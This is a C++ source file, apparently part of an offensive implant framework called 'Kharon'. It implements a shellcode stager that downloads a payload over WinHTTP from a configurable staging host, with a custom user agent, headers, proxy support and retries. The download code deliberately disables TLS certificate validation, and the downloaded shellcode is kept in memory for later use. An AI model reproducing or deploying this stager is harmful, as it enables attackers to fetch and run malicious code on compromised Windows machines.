#include <Kharon.h>

namespace Shellcode {
    uint8_t* Data = nullptr;
    size_t   Size = 0;

    static BOOL TryDownload(
        uint8_t** OutBuffer,
        DWORD*    OutSize
    ) {
        HINTERNET hSession  = nullptr;
        HINTERNET hConnect  = nullptr;
        HINTERNET hRequest  = nullptr;
        uint8_t*  Buffer    = nullptr;
        DWORD     BytesRead = 0;
        DWORD     TotalRead = 0;
        DWORD     BufSize   = 0;

        auto Clean = [&]( const char* reason = nullptr, DWORD err = 0 ) -> BOOL {
            if ( hRequest ) WinHttpCloseHandle( hRequest );
            if ( hConnect ) WinHttpCloseHandle( hConnect );
            if ( hSession ) WinHttpCloseHandle( hSession );

            if ( reason ) {
                if ( Buffer ) { HeapFree( GetProcessHeap(), 0, Buffer ); Buffer = nullptr; }
                if ( err ) DbgPrint( "%s (%d)\n", reason, err );
                else       DbgPrint( "%s\n", reason );
                return FALSE;
            }

            return TRUE;
        };

        DWORD dwAccessType = WINHTTP_ACCESS_TYPE_NO_PROXY;
        LPCWSTR pwszProxy  = WINHTTP_NO_PROXY_NAME;

        if ( StagingProfile::ProxyAddr[0] != L'\0' ) {
            dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
            pwszProxy    = StagingProfile::ProxyAddr;
        }

        hSession = WinHttpOpen(
            StagingProfile::UserAgent,
            dwAccessType,
            pwszProxy,
            WINHTTP_NO_PROXY_BYPASS,
            0
        );
        if ( !hSession ) {
            return Clean( "WinHttpOpen failed", GetLastError() );
        }

        hConnect = WinHttpConnect( hSession, StagingProfile::Host, StagingProfile::Port, 0 );
        if ( !hConnect ) {
            return Clean( "WinHttpConnect failed", GetLastError() );
        }

        DWORD dwRequestFlags = 0;
        if ( StagingProfile::Secure ) {
            dwRequestFlags = WINHTTP_FLAG_SECURE;
        }

        hRequest = WinHttpOpenRequest(
            hConnect,
            StagingProfile::Method,
            StagingProfile::Url,
            nullptr,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            dwRequestFlags
        );
        if ( !hRequest ) {
            return Clean( "WinHttpOpenRequest failed", GetLastError() );
        }

        if ( StagingProfile::Secure ) {
            DWORD dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                               SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                               SECURITY_FLAG_IGNORE_CERT_CN_INVALID;

            WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof( dwSecFlags ) );
        }

        if ( StagingProfile::Headers[0] != L'\0' ) {
            WinHttpAddRequestHeaders( hRequest, StagingProfile::Headers, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD );
        }

        if ( !WinHttpSendRequest( hRequest, NULL, 0, NULL, 0, 0, 0 ) ) {
            return Clean( "WinHttpSendRequest failed", GetLastError() );
        }

        if ( !WinHttpReceiveResponse( hRequest, nullptr ) ) {
            return Clean( "WinHttpReceiveResponse failed", GetLastError() );
        }

        DWORD StatusCode = 0;
        DWORD StatusSize = sizeof( StatusCode );
        WinHttpQueryHeaders( hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &StatusCode, &StatusSize, NULL );

        if ( StatusCode != 200 ) {
            DbgPrint( "HTTP status: %d\n", StatusCode );
            return Clean( "Unexpected HTTP status" );
        }

        DWORD ContentLength = 0;
        DWORD ClSize        = sizeof( ContentLength );

        if ( WinHttpQueryHeaders( hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &ContentLength, &ClSize, NULL ) && ContentLength > 0 ) {
            BufSize = ContentLength;
        } else {
            BufSize = 1024 * 1024;
        }

        Buffer = (uint8_t*)HeapAlloc( GetProcessHeap(), 0, BufSize );
        if ( !Buffer ) {
            return Clean( "HeapAlloc failed" );
        }

        TotalRead = 0;

        if ( ContentLength > 0 ) {
            while ( WinHttpReadData( hRequest, Buffer + TotalRead, BufSize - TotalRead, &BytesRead ) && BytesRead > 0 ) {
                TotalRead += BytesRead;
            }
        } else {
            while ( WinHttpReadData( hRequest, Buffer + TotalRead, BufSize - TotalRead, &BytesRead ) && BytesRead > 0 ) {
                TotalRead += BytesRead;

                if ( TotalRead >= BufSize ) {
                    BufSize *= 2;
                    uint8_t* NewBuf = (uint8_t*)HeapReAlloc( GetProcessHeap(), 0, Buffer, BufSize );
                    if ( !NewBuf ) {
                        return Clean( "HeapReAlloc failed" );
                    }
                    Buffer = NewBuf;
                }
            }
        }

        if ( TotalRead == 0 ) {
            return Clean( "No data received" );
        }

        *OutBuffer = Buffer;
        *OutSize   = TotalRead;

        return Clean();
    }

    BOOL Load() {
        uint8_t* Buffer = nullptr;
        DWORD    BufSize = 0;

        for ( int attempt = 0; attempt <= StagingProfile::MaxRetries; attempt++ ) {
            if ( attempt > 0 ) {
                DbgPrint( "Retry %d/%d after %dms\n", attempt, StagingProfile::MaxRetries, StagingProfile::RetryDelayMs * attempt );
                Sleep( StagingProfile::RetryDelayMs * attempt );
            }

            if ( TryDownload( &Buffer, &BufSize ) ) {
                Data = Buffer;
                Size = (size_t)BufSize;

                DbgPrint( "Shellcode downloaded — Data: 0x%p Size: %llu\n", Data, Size );
                return TRUE;
            }
        }

        DbgPrint( "All download attempts failed\n" );
        return FALSE;
    }
}